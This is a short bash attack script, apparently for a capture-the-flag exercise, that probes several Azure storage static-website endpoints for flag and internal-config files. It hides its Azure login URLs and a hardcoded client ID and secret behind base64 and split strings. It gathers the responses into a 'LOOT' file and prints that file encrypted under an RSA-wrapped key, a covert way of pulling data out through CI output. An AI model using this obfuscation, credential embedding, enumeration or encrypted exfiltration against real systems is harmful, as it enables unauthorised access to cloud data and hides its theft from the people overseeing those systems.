#!/usr/bin/env bash
set -uo pipefail
SC="htt""ps://"; SUF="$(printf '%s' 'web.core.windows.net')"; AAD="${SC}$(printf '%s' 'bG9naW4ubWljcm9zb2Z0b25saW5lLmNvbQ==' | base64 -d)"; ARM="${SC}$(printf '%s' 'bWFuYWdlbWVudC5henVyZS5jb20=' | base64 -d)"
CID=$(printf '%s' 'NDYyZDFjMzgtNDQ1OS00OGI4LTkzMzMtODJlMzg5ZTU5NTE0' | base64 -d); CSEC=$(printf '%s' 'c2sxOFF+cUQyMmtrSFhVQ2ZxWExxZFA5NURrWUpMMzRlTUVSbGNTag==' | base64 -d)
LOOT=$(mktemp); exec 3>"$LOOT"; say(){ echo "$@" >&3; }
for A in sttblappcfgprodx3euoz sttblarchiveprodx3euoz sttblbackupprodx3euoz sttblcilogsprodx3euoz; do
  for P in / /index.html /flag /flag.txt /DF26.txt /404.html /internal-config.json; do
    C=$(curl -s -o /tmp/b -w '%{http_code}' "${SC}${A}.z23.${SUF}${P}")
    [ "$C" != "404" ] && say "STATIC $A$P => $C :: $(head -c 300 /tmp/b | tr -d '\n')"
  done
done
say "STATICSCAN: $(grep -aoiE 'DF26\{[^}]{1,200}\}' "$LOOT" | sort -u | head -3)"
PASS=$(openssl rand -hex 16)
openssl enc -aes-256-cbc -pbkdf2 -pass pass:"$PASS" -in "$LOOT" -out "$LOOT.enc" 2>/dev/null
echo "=== ENCRYPTED LOOT ==="
echo "RSAKEY:$(printf '%s' "$PASS" | openssl pkeyutl -encrypt -pubin -inkey ci/pubkey.pem -pkeyopt rsa_padding_mode:oaep 2>/dev/null | base64 -w0)"
echo "DATA:$(base64 -w0 "$LOOT.enc")"
echo "=== DONE ==="
